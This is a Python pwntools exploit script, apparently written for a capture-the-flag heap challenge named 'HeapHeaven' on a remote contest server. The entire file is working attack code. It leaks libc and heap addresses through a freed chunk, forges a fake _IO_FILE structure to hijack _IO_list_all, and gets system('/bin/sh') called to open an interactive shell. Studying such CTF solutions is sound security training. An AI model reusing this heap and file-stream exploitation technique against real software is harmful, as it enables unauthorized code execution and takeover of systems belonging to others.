from pwn import *

LOCAL = False

def alloc(size):
	target.recvuntil("NOM-NOM\n")
	target.sendline("whaa!")
	target.recvuntil("I'll prepare your happa happa, darling...\n")
	target.sendline(size)

def writef(size, data):
	target.recvuntil("NOM-NOM\n")
	target.sendline("<spill>")
	target.recvuntil("What are you doing?\n")
	target.sendline(size)
	target.recvuntil("Look at this mess, darling!\n")
	target.sendline(data)

def printf(size):
	target.recvuntil("NOM-NOM\n")
	target.sendline("mommy?")
	target.sendline(size)
	#target.recvuntil("NOM-NOM\n")

def delf(size):
	target.recvuntil("NOM-NOM\n")
	target.sendline("NOM-NOM")
	target.sendline(size)


def pwn():
	log.info("HeapHeaven - by mphx2\n\n")
        #alloc("wi" + "wa" * 7 + "a" )
        alloc("wi" + "wa" * 10 + "a" )
        alloc("wi" * 5 + "a")
        alloc("wi" * 5 + "a")
        delf("wi" + "wa" * 4 + "wb")
        printf("wi" + "wa" * 4 + "wb")
        target.recvuntil("darling: ")
        leak = u64(target.recv(6).ljust(8, "\x00")) - 88
        libc_base  = leak - 0x3c4b20
        vuln = libc_base + 0x3c4aed
        _IO_list_all = libc_base + 0x3c5520
        system = libc_base + 0x45390
        log.info("main_arena : " + hex(leak))
        log.info("libc_base : " + hex(libc_base))
        alloc("wi" + "wa" * 7 + "a")
        writef("\x00" * 100, "A" * 0x18 + p64(0x91) + "B" * 0x10)
        printf("wi" + "wa" * 4 + "wb")
        target.recvuntil("B" * 0x10)
        heap_base = u64(target.recv(6).ljust(8, "\x00")) - 0x20
        log.info("heap_base : " + hex(heap_base))

        exp = "a" * 0xa0 + "/bin/sh\x00" + p64(0x61)
        exp += p64(0xdeadbeef) + p64(_IO_list_all - 0x10)
        exp += p64(2) + p64(3) + p64(0x200) * 8
        exp += p64(0) + p64(system)
        exp += p64(0) * 4
        exp += p64(heap_base + 0xb0 + 0x90) + p64(3) + p64(4) + p64(0) + p64(2) + p64(0) * 2
        exp += p64(heap_base + 0xb0 + 0x60)             # vtable

        writef("\x00" * 100, exp)
        target.sendline("whaa!")
        target.sendline("wiwi")

	target.interactive()


def main():
    global target
    if LOCAL:
        target = process("./HeapHeaven")
        pause()
    else:
        target = remote("flatearth.fluxfingers.net", "1743")
    pwn()

if __name__ == "__main__":
    main()
